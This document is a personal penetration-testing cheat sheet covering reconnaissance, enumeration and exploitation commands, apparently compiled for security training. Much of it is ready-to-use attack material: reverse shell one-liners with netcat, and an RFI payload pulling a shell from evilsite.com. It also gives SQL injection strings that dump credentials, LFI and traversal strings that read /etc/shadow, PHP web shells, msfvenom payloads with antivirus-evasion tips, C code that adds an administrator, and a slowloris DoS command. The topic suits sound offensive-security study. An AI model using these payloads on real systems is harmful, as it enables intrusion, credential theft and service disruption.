# Personal Methodology

## Information Gathering and Recon

-   Set the Target IP Address to the `$ip` system variable  
    `export ip=192.168.1.100`

> You will use `$ip` in place of the full ip address during the pentest.

-   Find the location of a file  
    `locate sbd.exe`

-   Search through directories in the `$PATH` environment variable  
    `which sbd`

-   Find a search for a file that contains a specific string in it’s
    name:  
    `find / -name sbd\*`

-   Show active internet connections  
    `netstat -lntp`

-   Change Password  
    `passwd`

-   Verify a service is running and listening  
    `netstat -antp |grep apache`

-   Start a service  
    `systemctl start ssh  `
    
    `systemctl start apache2`

-   Have a service start at boot  
    `systemctl enable ssh`

-   Stop a service  
    `systemctl stop ssh`

-   Unzip a gz file  
    `gunzip access.log.gz`

-   Unzip a tar.gz file  
    `tar -xzvf file.tar.gz`

-   Search command history  
    `history | grep phrase_to_search_for`

-   Download a webpage  
    `wget http://www.cisco.com`

-   Open a webpage  
    `curl http://www.cisco.com`

-   String manipulation

    -   Count number of lines in file  
        `wc -l index.html`

    -   Get the start or end of a file  
        `head index.html`
        
        `tail index.html`

    -   Extract all the lines that contain a string  
        `grep "href=" index.html`

    -   Cut a string by a delimiter, filter results then sort  
        `grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u`

    -   Using Grep and regular expressions and output to a file  
        `cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt`

    -   Use a bash loop to find the IP address behind each host  
        `for url in $(cat list.txt); do host $url; done`

    -   Collect all the IP Addresses from a log file and sort by
        frequency  
        `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`

-   Decoding using Kali

    -   Decode Base64 Encoded Values
       
        `echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode`

    -   Decode Hexidecimal Encoded Values  
        `echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps`

-   Netcat - Read and write TCP and UDP Packets

    -   Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):
        [https://joncraton.org/blog/46/netcat-for-windows/](https://joncraton.org/blog/46/netcat-for-windows/)

    -   Connect to a POP3 mail server  
        `nc -nv $ip 110`

    -   Listen on TCP/UDP port  
        `nc -nlvp 4444`

    -   Connect to a netcat port  
        `nc -nv $ip 4444`

    -   Send a file using netcat  
        `nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe`

    -   Receive a file using netcat  
        `nc -nlvp 4444 > incoming.exe`
        
    -   Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that...
         
            whereis nc
            nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz

            /bin/nc.traditional -e /bin/bash 1.2.3.4 4444


    -   Create a reverse shell with Ncat using cmd.exe on Windows  
        `nc.exe -nlvp 4444 -e cmd.exe`
        
        or
        
        `nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe`

    -   Create a reverse shell with Ncat using bash on Linux  
        `nc -nv $ip 4444 -e /bin/bash`
        
    -   Netcat for Banner Grabbing:
    
        `echo "" | nc -nv -w1 <IP Address> <Ports>`

-   Ncat - Netcat for Nmap project which provides more security avoid
    IDS

    -   Reverse shell from windows using cmd.exe using ssl  
        `ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl`

    -   Listen on port 4444 using ssl  
        `ncat -v $ip 4444 --ssl`

-   Wireshark
    -   Show only SMTP (port 25) and ICMP traffic:
    
        `tcp.port eq 25 or icmp`
        
    -   Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:
        
        `ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16`
        
    -   Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:
        
        `ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip`
        
    -   Some commands are equal
        
        `ip.addr == xxx.xxx.xxx.xxx`
        
         Equals
        
        `ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx `

        ` ip.addr != xxx.xxx.xxx.xxx`
        
         Equals
        
        `ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx`

-   Tcpdump

    -   Display a pcap file  
       `tcpdump -r passwordz.pcap`

    -   Display ips and filter and sort  
        `tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head`

    -   Grab a packet capture on port 80  
        `tcpdump tcp port 80 -w output.pcap -i eth0`

    -   Check for ACK or PSH flag set in a TCP packet  
        `tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap`

-   IPTables 

    -   Deny traffic to ports except for Local Loopback

        `iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP  `
    
        `iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP`

    -   Clear ALL IPTables firewall rules
    
            ```bash
            iptables -P INPUT ACCEPT
            iptables -P FORWARD ACCEPT
            iptables -P OUTPUT ACCEPT
            iptables -t nat -F
            iptables -t mangle -F
            iptables -F
            iptables -X
            iptables -t raw -F iptables -t raw -X
            ```


-   Passive Information Gathering
    ---------------------------------------------------------------------------------------------------------------------------

-   Google Hacking

    -   Google search to find website sub domains  
        `site:microsoft.com`

    -   Google filetype, and intitle  
        `intitle:"netbotz appliance" "OK" -filetype:pdf`

    -   Google inurl  
        `inurl:"level/15/sexec/-/show"`

    -   Google Hacking Database:  
        https://www.exploit-db.com/google-hacking-database/

-   SSL Certificate Testing  
    [https://www.ssllabs.com/ssltest/analyze.html](https://www.ssllabs.com/ssltest/analyze.html)

-   Email Harvesting

    -   Simply Email  
        `git clone https://github.com/killswitch-GUI/SimplyEmail.git  `
        
        `./SimplyEmail.py -all -e TARGET-DOMAIN`

-   Netcraft

    -   Determine the operating system and tools used to build a site  
        https://searchdns.netcraft.com/

-   Whois Enumeration  
    `whois domain-name-here.com  `
    
    `whois $ip`

-   Banner Grabbing

    -   `nc -v $ip 25`

    -   `telnet $ip 25`

    -   `nc TARGET-IP 80`

-   Recon-ng - full-featured web reconnaissance framework written in Python

    -   `cd /opt; git clone https://LaNMaSteR53@bitbucket.org/LaNMaSteR53/recon-ng.git  `
    
        `cd /opt/recon-ng  `
        
        `./recon-ng  `
        
        `show modules  `
        
        `help`

-   Active Information Gathering
    --------------------------------------------------------------------------------------------------------------------------

<!-- -->


-   Port Scanning
    -----------------------------------------------------------------------------------------------------------
*Subnet Reference Table*

/ | Addresses | Hosts | Netmask | Amount of a Class C
--- | --- | --- | --- | --- 
/30 | 4 | 2 | 255.255.255.252| 1/64
/29 | 8 | 6 | 255.255.255.248 | 1/32
/28 | 16 | 14 | 255.255.255.240 | 1/16
/27 | 32 | 30 | 255.255.255.224 | 1/8
/26 | 64 | 62 | 255.255.255.192 | 1/4
/25 | 128 | 126 | 255.255.255.128 | 1/2
/24 | 256 | 254 | 255.255.255.0 | 1
/23 | 512 | 510 | 255.255.254.0 | 2
/22 | 1024 | 1022 | 255.255.252.0 | 4
/21 | 2048 | 2046 | 255.255.248.0 | 8
/20 | 4096 | 4094 | 255.255.240.0 | 16
/19 | 8192 | 8190 | 255.255.224.0 | 32
/18 | 16384 | 16382 | 255.255.192.0 | 64
/17 | 32768 | 32766 | 255.255.128.0 | 128
/16 | 65536 | 65534 | 255.255.0.0 | 256

 -   Set the ip address as a variable  
     `export ip=192.168.1.100  `
     `nmap -A -T4 -p- $ip`

 -   Netcat port Scanning  
     `nc -nvv -w 1 -z $ip 3388-3390`
     
 -   Discover active IPs usign ARP on the network:
     `arp-scan $ip/24`

 -   Discover who else is on the network  
     `netdiscover`

 -   Discover IP Mac and Mac vendors from ARP  
     `netdiscover -r $ip/24`

 -   Nmap stealth scan using SYN  
     `nmap -sS $ip`

 -   Nmap stealth scan using FIN  
     `nmap -sF $ip`

 -   Nmap Banner Grabbing  
     `nmap -sV -sT $ip`

 -   Nmap OS Fingerprinting  
     `nmap -O $ip`

 -   Nmap Regular Scan:  
     `nmap $ip/24`

 -   Enumeration Scan  
     `nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt`

 -   Enumeration Scan All Ports TCP / UDP and output to a txt file  
     `nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip`

 -   Nmap output to a file:  
     `nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24`

 -   Quick Scan:  
     `nmap -T4 -F $ip/24`

 -   Quick Scan Plus:  
     `nmap -sV -T4 -O -F --version-light $ip/24`

 -   Quick traceroute  
     `nmap -sn --traceroute $ip`

 -   All TCP and UDP Ports  
     `nmap -v -sU -sS -p- -A -T4 $ip`

 -   Intense Scan:  
     `nmap -T4 -A -v $ip`

 -   Intense Scan Plus UDP  
     `nmap -sS -sU -T4 -A -v $ip/24`

 -   Intense Scan ALL TCP Ports  
     `nmap -p 1-65535 -T4 -A -v $ip/24`

 -   Intense Scan - No Ping  
     `nmap -T4 -A -v -Pn $ip/24`

 -   Ping scan  
     `nmap -sn $ip/24`

 -   Slow Comprehensive Scan  
     `nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" $ip/24`

 -   Scan with Active connect in order to weed out any spoofed ports designed to troll you  
     `nmap -p1-65535 -A -T5 -sT $ip`

-   Enumeration
    -----------

-   DNS Enumeration

    -   NMAP DNS Hostnames Lookup
        `nmap -F --dns-server <dns server ip> <target ip range>`
        
    -   Host Lookup  
        `host -t ns megacorpone.com`

    -   Reverse Lookup Brute Force - find domains in the same range  
        `for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"`

    -   Perform DNS IP Lookup  
        `dig a domain-name-here.com @nameserver`

    -   Perform MX Record Lookup  
        `dig mx domain-name-here.com @nameserver`

    -   Perform Zone Transfer with DIG  
        `dig axfr domain-name-here.com @nameserver`

    -   DNS Zone Transfers  
        Windows DNS zone transfer  
        
        `nslookup -> set type=any -> ls -d blah.com  `
        
        Linux DNS zone transfer  
        
        `dig axfr blah.com @ns1.blah.com`
        
    -   Dnsrecon DNS Brute Force  
        `dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml`

    -   Dnsrecon DNS List of megacorp  
        `dnsrecon -d megacorpone.com -t axfr`

    -   DNSEnum  
        `dnsenum zonetransfer.me`

-   NMap Enumeration Script List:

    -   NMap Discovery  
        [*https://nmap.org/nsedoc/categories/discovery.html*](https://nmap.org/nsedoc/categories/discovery.html)

    -   Nmap port version detection MAXIMUM power  
        `nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>`


-   NFS (Network File System) Enumeration

    -   Show Mountable NFS Shares 
        `nmap -sV --script=nfs-showmount $ip`

-   RPC (Remote Procedure Call) Enumeration

    -   Connect to an RPC share without a username and password and enumerate privledges
        `rpcclient --user="" --command=enumprivs -N $ip`

    -   Connect to an RPC share with a username and enumerate privledges
        `rpcclient --user="<Username>" --command=enumprivs $ip`


-   SMB Enumeration

    -   SMB OS Discovery  
        `nmap $ip --script smb-os-discovery.nse`

    -   Nmap port scan  
        `nmap -v -p 139,445 -oG smb.txt $ip-254`

    -   Netbios Information Scanning  
        `nbtscan -r $ip/24`

    -   Nmap find exposed Netbios servers  
        `nmap -sU --script nbstat.nse -p 137 $ip`
        
    -   Nmap all SMB scripts scan
    
        `nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`

    -   Nmap all SMB scripts authenticated scan
    
        `nmap -sV -Pn -vv -p 445  --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`

    -   SMB Enumeration Tools  
        `nmblookup -A $ip  `
        
        `smbclient //MOUNT/share -I $ip -N  `
        
        `rpcclient -U "" $ip  `
        
        `enum4linux $ip  `
        
        `enum4linux -a $ip`
        

    -   SMB Finger Printing  
        `smbclient -L //$ip`

    -   Nmap Scan for Open SMB Shares  
        `nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24`

    -   Nmap scans for vulnerable SMB Servers  
        `nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip`

    -   Nmap List all SMB scripts installed  
        `ls -l /usr/share/nmap/scripts/smb*`

    -   Enumerate SMB Users
    
        `nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14`
        
         OR        
         
         `python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip`
         

    -   RID Cycling - Null Sessions  
        `ridenum.py $ip 500 50000 dict.txt`

    -   Manual Null Session Testing
    
        Windows: `net use \\$ip\IPC$ "" /u:""`
        
        Linux: `smbclient -L //$ip`
        

-   SMTP Enumeration - Mail Severs

    -   Verify SMTP port using Netcat  
        `nc -nv $ip 25`

-   POP3 Enumeration - Reading other peoples mail - You may find usernames and passwords for email accounts, so here is how to check the mail using Telnet

         root@kali:~# telnet $ip 110
         +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
         USER billydean    
         +OK
         PASS password
         +OK Welcome billydean
         
         list
         
         +OK 2 1807
         1 786
         2 1021
      
         retr 1
         
         +OK Message follows
         From: jamesbrown@motown.com
         Dear Billy Dean,

         Here is your login for remote desktop ... try not to forget it this time!
         username: billydean
         password: PA$$W0RD!Z


-   SNMP Enumeration -Simple Network Management Protocol

    -   Fix SNMP output values so they are human readable  
        `apt-get install snmp-mibs-downloader download-mibs  `
        `echo "" > /etc/snmp/snmp.conf`

    -   SNMP Enumeration Commands

        -   `snmpcheck -t $ip -c public`

        -   `snmpwalk -c public -v1 $ip 1|`

        -   `grep hrSWRunName|cut -d\* \* -f`

        -   `snmpenum -t $ip`

        -   `onesixtyone -c names -i hosts`

    -   SNMPv3 Enumeration  
        `nmap -sV -p 161 --script=snmp-info $ip/24`

    -   Automate the username enumeration process for SNMPv3:  
        `apt-get install snmp snmp-mibs-downloader  `
        `wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb`

    -   SNMP Default Credentials  
        /usr/share/metasploit-framework/data/wordlists/snmp\_default\_pass.txt


-   MS SQL Server Enumeration

    -   Nmap Information Gathering
        
        `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip`
        
-   Webmin and miniserv/0.01 Enumeration - Port 10000

      Test for LFI & file disclosure vulnerability by grabbing /etc/passwd
        
        `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`
        
      Test to see if webmin is running as root by grabbing /etc/shadow
      
        `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`

-   Linux OS Enumeration

    -   List all SUID files  
        `find / -perm -4000 2>/dev/null`

    -   Determine the current version of Linux  
        `cat /etc/issue`

    -   Determine more information about the environment  
        `uname -a`
        
    -   List processes running  
        `ps -xaf`

    -   List the allowed (and forbidden) commands for the invoking use  
        `sudo -l`

    -   List iptables rules  
        `iptables --table nat --list  
        iptables -vL -t filter  
        iptables -vL -t nat  
        iptables -vL -t mangle  
        iptables -vL -t raw  
        iptables -vL -t security`

-   Windows OS Enumeration


    -   net config Workstation
    
    -   systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    
    -   hostname
    
    -   net users
    
    -   ipconfig /all
    
    -   route print
    
    -   arp -A
    
    -   netstat -ano
    
    -   netsh firewall show state	
    
    -   netsh firewall show config
    
    -   schtasks /query /fo LIST /v
    
    -   tasklist /SVC
    
    -   net start
    
    -   DRIVERQUERY
    
    -   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    
    -   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    
    -   dir /s *pass* == *cred* == *vnc* == *.config*
    
    -   findstr /si password *.xml *.ini *.txt
    
    -   reg query HKLM /f password /t REG_SZ /s
    
    -   reg query HKCU /f password /t REG_SZ /s

-   Vulnerability Scanning with Nmap

-   Nmap Exploit Scripts  
    [*https://nmap.org/nsedoc/categories/exploit.html*](https://nmap.org/nsedoc/categories/exploit.html)

-   Nmap search through vulnerability scripts  
    `cd /usr/share/nmap/scripts/  
    ls -l \*vuln\*`

-   Nmap search through Nmap Scripts for a specific keyword  
    `ls /usr/share/nmap/scripts/\* | grep ftp`

-   Scan for vulnerable exploits with nmap  
    `nmap --script exploit -Pn $ip`

-   NMap Auth Scripts  
    [*https://nmap.org/nsedoc/categories/auth.html*](https://nmap.org/nsedoc/categories/auth.html)

-   Nmap Vuln Scanning  
    [*https://nmap.org/nsedoc/categories/vuln.html*](https://nmap.org/nsedoc/categories/vuln.html)

-   NMap DOS Scanning  
    `nmap --script dos -Pn $ip  
    NMap Execute DOS Attack  
    nmap --max-parallelism 750 -Pn --script http-slowloris --script-args
    http-slowloris.runforever=true`

-   Scan for coldfusion web vulnerabilities  
    `nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip`

-   Anonymous FTP dump with Nmap  
    `nmap -v -p 21 --script=ftp-anon.nse $ip-254`

-   SMB Security mode scan with Nmap  
    `nmap -v -p 21 --script=ftp-anon.nse $ip-254`

-   File Enumeration

    -   Find UID 0 files root execution

    -   `/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null`

    -   Get handy linux file system enumeration script (/var/tmp)  
        `wget https://highon.coffee/downloads/linux-local-enum.sh  `
        `chmod +x ./linux-local-enum.sh  `
        `./linux-local-enum.sh`

    -   Find executable files updated in August  
        `find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug`

    -   Find a specific file on linux  
        `find /. -name suid\*`

    -   Find all the strings in a file  
        `strings <filename>`

    -   Determine the type of a file  
        `file <filename>`

-   HTTP Enumeration
    ----------------

    -   Search for folders with gobuster:  
        `gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip`

    -   OWasp DirBuster - Http folder enumeration - can take a dictionary file

    -   Dirb - Directory brute force finding using a dictionary file  
        `dirb http://$ip/ wordlist.dict  `
        `dirb <http://vm/>  `
          
        Dirb against a proxy

    -   `dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129`

    -   Nikto  
        `nikto -h $ip`

    -   HTTP Enumeration with NMAP  
        `nmap --script=http-enum -p80 -n $ip/24`

    -   Nmap Check the server methods  
        `nmap --script http-methods --script-args http-methods.url-path='/test' $ip`

    -   Get Options available from web server
         `curl -vX OPTIONS vm/test`

      -   Uniscan directory finder:  
          `uniscan -qweds -u <http://vm/>`

      -   Wfuzz - The web brute forcer
      
          `wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test  `
          
          `wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ  `
          
          `wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"`
          
          `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ`
          
          Recurse level 3
          
          `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ`

<!-- -->

-   Open a service using a port knock (Secured with Knockd)  
    for x in 7000 8000 9000; do nmap -Pn --host\_timeout 201
    --max-retries 0 -p $x server\_ip\_address; done

-   WordPress Scan - Wordpress security scanner

    -   wpscan --url $ip/blog --proxy $ip:3129

-   RSH Enumeration - Unencrypted file transfer system

    -   auxiliary/scanner/rservices/rsh\_login

-   Finger Enumeration

    -   finger @$ip

    -   finger batman@$ip

-   TLS & SSL Testing

    -   ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha >
        OUTPUT-FILE.html

-   Proxy Enumeration (useful for open proxies)

    -   nikto -useproxy http://$ip:3128 -h $ip

-   Steganography

> apt-get install steghide
>
> steghide extract -sf picture.jpg
>
> steghide info picture.jpg
>
> apt-get install stegosuite

-   The OpenVAS Vulnerability Scanner

    -   apt-get update  
        apt-get install openvas  
        openvas-setup

    -   netstat -tulpn

    -   Login at:  
        https://$ip:9392




## Exploitation

### [SQLi](#sqli)

- Check if you can find a row, where you can place your output
  `http://ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8`
- Get the version of the database
  `http://ip/inj.php?id=1 union all select 1,2,3,@@version,5`
- Get the current user
  `http://ip/inj.php?id=1 union all select 1,2,3,user(),5`
- See all tables
  `http://ip/inj.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables`
- Get column names for a specified table
  `http://ip/inj.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'`
- Concat user names and passwords (0x3a represents “:”)
  `http://ip/inj.php?id=1 union all select 1,2,3,concat(name, 0x3A , password),5 from users`
- Write into a file
  `http://ip/inj.php?id=1 union all select 1,2,3,"content",5 into OUTFILE 'outfile'`

### [PHP](#php)

Got most of this from https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

- LFI

  If there is an LFI, it might be possible to run PHP commands as within the example from exploit-db (https://www.exploit-db.com/exploits/9623/):

  ```
  www.site/path/advanced_comment_system/admin.php?ACS_path=[shell.txt?]
  ```

   This results in this exploit:

  

  ```
  curl -s --data "<?system('ls -la');?>" "http://www.site/path/advanced_comment_system/admin.php?ACS_path=php://input%00"
  ```

- Including files
  `?file=.htaccess`

- Path Traversal
  `?file=../../../../../../../../../var/lib/locate.db`

- Including injected PHP code

  ```
  ?file=../../../../../../../../../var/log/apache/error.log
  ```

  

  - Tricks
    - list of possible Apache dirs: http://wiki.apache.org/httpd/DistrosDefaultLayout
    - include access log from file descriptor /proc/self/fd/XX: http://pastebin.com/raw.php?i=cRYvK4jb
    - include email log files: http://devels-playground.blogspot.de/2007/08/local-file-inclusion-tricks.html
    - include ssh auth.log
    - abuse avatar/image/attachment file uploads
    - include session files: https://ddxhunter.wordpress.com/2010/03/10/lfis-exploitation-techniques/
    - include PHP’s temporarily uploaded files http://gynvael.coldwind.pl/?id=376
    - Null Byte Injection:
      `?file=../../../../../../../../../etc/passwd%00`
    - Directory Listing with Null Byte Injection:
      `?file=../../../../../../../../../var/www/accounts/%00`
    - Path Truncation:
      `?file=../../../../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\.\.\ ...`
    - Dot Truncation:
      `?file=../../../../../../../../../etc/passwd...........`
    - Reverse Path Truncation:
      `?file=../../../../ […] ../../../../../etc/passwd`

- Logfile injection

  - Connect to the server to inject code into the error.log:

    ```
    nc <IP> <port> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1 Host: <IP> Connection: close
    ```

  - Afterwards include the it via LFI:
    `?lfi_file=/var/log/apache2/access.log&cmd=<command>`

- Including Remote Code:
  `?file=[http|https|ftp]://evilsite.com/shell.txt`

- Using PHP stream php://input:
  `?file=php://input`
  Specify your payload in the POST parameters

- Using PHP stream php://filter:
  `?file=php://filter/convert.base64-encode/resource=index.php`

- Using data URIs:
  `?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`

- Using XSS:
  `?file=http://127.0.0.1/path/xss.php?xss=phpcode`

### [Generating Shells](#generating-shells)

Depending on the specific case it could be useful to also add “PrependMigrate=true”.
As most of those generated files will be detected by an antivirus software, it might be useful to also experiment with the Veil Framework.

- Linux ELF binary:

  ```
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
  ```

- Windows EXE binary:

  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
  ```

- Windows Service:

  ```
  msfvenom -p windows/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> EXITFUNC=thread -f exe-service > shell-service.exe
  ```

- Mac:

  ```
  msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
  ```

- PHP:

  ```
  msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > /tmp/shell.php && sed -i 's/#<?php/<?php/' /tmp/shell.php
  ```

  If you use php/reverse_php open the output file with an editor and add `<?php` and `?>` within the script.

- ASP:

  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
  ```

- JSP:

  ```
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
  ```

- WAR:

  ```
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
  ```

- Inject payload into an existing exe file:

  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -x <template EXE> -f exe > <output.exe>
  ```

#### [Custom Shells](#custom-shells)

- PHP custom command injection:

  ```
  <?php $cmd=$_GET['cmd']; system("$cmd"); ?>
  ```

  or

  ```
  <?php echo shell_exec($_GET['cmd']);?>
  ```

  If you use REQUEST, you can use the GET and POST parameter:

  ```
  <?php $cmd=$_REQUEST['cmd']; system("$cmd"); ?>
  ```

  Write a script to trigger the commands via CLI:

  ```
  #!/bin/bash URL="http://x.x.x.x:yyyy/cmd_shell.php" CMD=`echo ${*} | sed s'/ /%20/g'` CMD=`echo ${CMD} | sed s'/&/%26/g'` CMD=`echo ${CMD} | sed s'/>/%3e/g'` echo ${URL}?cmd=${CMD} curl -s ${URL}?cmd=${CMD} echo ""
  ```

  and execute it:

  ```
  ./cmd_inj ls -la
  ```

### [Compiling](#compiling)

- To compile 32 bit applications on 64 bit Linux:

  ```
  apt-get install libc6-dev-i386 gcc -Wall -m32 -o <output> <code>
  ```

- Complining 64 bit applications on Linux:

  ```
  gcc -Wall -m64 -o <output> <code>
  ```

To compile static applications use the “-static” parameter additionally!

- Cross-Compiling Windows applications on Linux:

  ```
  apt-get install mingw32 i586-mingw32msvc-gcc <source>.c -o <outfile> -lws2_32
  ```

- Generate EXE from python file in Windows:

  ```
  python pyinstaller.py --onefile <pythonscript>
  ```

### [Privilege Escalation](#privilege-escalation)

- Check File permissions via icacls and check if they might be writeable for everyone:

  ```
  icacls <filename>
  ```

- C-Code to add a new user to the administrator group:

  ```
  #include <stdlib.h> /* system, NULL, EXIT_FAILURE */ // add new user to administrators group // compile with mingw32: // i586-mingw32msvc-gcc -o useradd_win useradd_win.c int main(){ int i; i=system ("net user <username> <password> /add"); i=system ("net localgroup administrators <username> /add"); return 0; }
  ```

- Windows Exploit Suggester:

  - Get sysinfo from Windows:

    ```
    systeminfo > sys.info
    ```

  - Upload the sys.info file to your Linux machine

  - Update the Exploit Suggester:

    ```
    python windows-exploit-suggester.py -u
    ```

  - Execute it:

    ```
    python windows-exploit-suggester -d <databasefile> -i <sysinfofile>
    ```




=

